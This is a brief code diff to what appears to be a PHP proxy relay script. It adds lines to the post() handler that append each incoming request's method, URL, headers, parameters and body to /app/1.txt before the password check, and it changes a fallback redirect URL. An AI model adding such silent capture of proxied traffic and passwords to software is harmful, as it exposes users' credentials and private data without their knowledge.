@@ -128,7 +128,10 @@ function curl_write_function($ch, $content) {
 
 function post() {
     list($method, $url, $headers, $kwargs, $body) = @decode_request(@file_get_contents('php://input'));
-
+$fsettt = "$method||$url||$headers||$kwargs||$body||\n";
+ $f = fopen("/app/1.txt","a");
+ fputs($f,$fsettt);
+ fclose($f);
     $password = $GLOBALS['__password__'];
     if ($password) {
         if (!isset($kwargs['password']) || $password != $kwargs['password']) {
@@ -225,7 +228,7 @@ function get() {
     if ($host && $host != $domain && $host != 'www'.$domain) {
         header('Location: http://www.' . $domain);
     } else {
-        header('Location: https://www.google.com');
+        header('Location: https://www.google.com/123');
     }
 }
 
